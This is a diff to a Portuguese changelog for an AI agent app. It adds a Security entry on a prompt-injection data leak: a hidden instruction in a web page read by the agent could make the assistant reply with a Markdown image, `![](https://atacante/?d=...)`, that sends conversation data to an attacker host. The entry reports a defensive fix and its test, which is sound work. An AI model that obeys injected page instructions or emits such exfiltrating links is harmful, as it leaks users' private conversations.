@@ -110,6 +110,13 @@ e o projeto adota o [Versionamento Semântico](https://semver.org/lang/pt-BR/).
   cada chamada ao LLM (até nove por turno, com tools) trazia e validava o histórico inteiro, que
   cresce sem limite, para depois descartar em memória a parte já resumida.
 
+### Security
+
+- Imagens em Markdown na resposta do assistente aparecem como link e não são mais carregadas. O
+  navegador busca uma imagem sozinho, sem clique: uma instrução escondida numa página lida pelo
+  agente podia pedir a resposta `![](https://atacante/?d=<dados da conversa>)` e receber os dados
+  na requisição. Coberto pelo spec e2e `prompt-injection.spec.ts`.
+
 ## [0.2.0] - 2026-09-30
 
 Guardrails do agente, limites de uso, ajustes de desempenho para vários usuários e leitura da
